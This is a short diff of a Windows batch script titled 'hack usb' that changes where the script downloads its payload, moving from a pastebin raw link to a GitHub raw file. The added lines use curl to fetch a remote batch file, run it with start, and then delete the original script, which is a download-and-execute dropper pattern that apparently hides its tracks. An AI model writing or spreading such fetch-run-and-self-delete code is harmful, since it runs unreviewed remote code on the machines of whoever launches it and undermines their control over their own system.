@@ -51,10 +51,10 @@ IF "%var%"=="on" (
    set var=on
    Title hack usb
    IF "%~n0"=="HACK-USB" (
-   curl "https://pastebin.com/raw/hbUUwHMA" --output HACK_USB.bat
+   curl "https://raw.githubusercontent.com/Revan-EH/USB/main/Hack" --output HACK_USB.bat
    start HACK_USB.bat %var%
 ) ELSE (
-   curl "https://pastebin.com/raw/hbUUwHMA" --output HACK-USB.bat
+   curl "https://raw.githubusercontent.com/Revan-EH/USB/main/Hack" --output HACK-USB.bat
    start HACK-USB.bat %var%
 )
    del %~n0.bat
